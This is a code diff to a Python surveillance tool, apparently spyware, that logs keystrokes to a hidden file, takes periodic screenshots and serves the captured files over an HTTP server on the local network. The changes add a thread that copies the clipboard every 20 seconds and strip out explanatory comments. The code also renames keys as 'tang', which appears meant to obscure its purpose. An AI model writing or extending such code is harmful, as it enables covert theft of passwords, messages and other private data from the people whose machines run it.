@@ -47,8 +47,8 @@ else:
 
 gom = 0x02
 count = 0
+interval = 20
 
-# List to store the pressed tang
 tangs = []
 sys_info = "syseminfo.txt"
 clip_inf = "clip_inf.txt"
@@ -113,14 +113,19 @@ def copy_clipboard():
         if not ret:
             raise ctypes.WinError()
 
+def copy_clipboard_periodically(interval):
+    while True:
+        copy_clipboard()
+        time.sleep(interval)
+
+t = threading.Thread(target=copy_clipboard_periodically, args=(interval,))
+t.start()
 ########################################
 # screen_info
 ########################################
 
 def screenshot():
-    # Get the current time as a string to use as the filename
     filename = time.strftime("%Y-%m-%d_%H-%M-%S.png")
-    # Take a screenshot and save it in the screenshots directory
     im = ImageGrab.grab()
     im.save(os.path.join("screenshots", filename))
     print(f"Screenshot taken and saved as {filename}")
@@ -129,8 +134,6 @@ def take_screenshots_periodically(interval):
     while True:
         screenshot()
         time.sleep(interval)
-
-interval = 5
 
 t = threading.Thread(target=take_screenshots_periodically, args=(interval,))
 t.start()
@@ -152,35 +155,30 @@ def on_press(tang):
     tangs.append(tang)
     count += 1
 
-    # If the number of presses reaches 10, write the tangs to file
     if count >= 10:
         count = 0
         write_file(tangs)
         tangs = []
 
-# Callback function to handle tang release events
 def on_release(tang):
     if tang == Key.esc:
         return False
 
-# Write the pressed tangs to file
 def write_file(tangs):
-    # For *nix systems, add a '.' prefix to the file name
+
     prefix = '.' if os.name != 'nt' else ''
     file_name = prefix + 'tjo.txt'
 
-    # Open the file in append mode and write the tangs
     with open(file_name, 'a') as file:
         for tang in tangs:
             tang = str(tang).replace("'","")
-            # If the tang is space or enter, write a newline character
+
             if 'space' in tang or 'enter' in tang:
                 file.write('\n')
-            # If the tang is not recognized, write its value as is
+
             elif 'Key' not in tang:
                 file.write(tang)
 
-    # For Windows systems, set the file as hidden
     if os.name == 'nt':
         ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, gom)
         if not ret:
@@ -198,13 +196,12 @@ class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
         pass
 
 def r_s():
-    # Get the IP address of the computer on the local network
+
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("10.80.72.51", 5000))
     ip_address = s.getsockname()[0]
     s.close()
     
-    # Start the server
     server = socketserver.TCPServer((ip_address, 8000), MyHTTPHandler)
     server.quet = True
     server_thread = threading.Thread(target=server.serve_forever)
@@ -215,10 +212,9 @@ def r_s():
 # start
 ########################################
 
-# Start the tang listener in a separate thread
 if __name__ == '__main__':
     freeze_support()
-    # Start the tang listener in a separate thread
+
     thread = threading.Thread(target=r_s)
     thread.start()
 
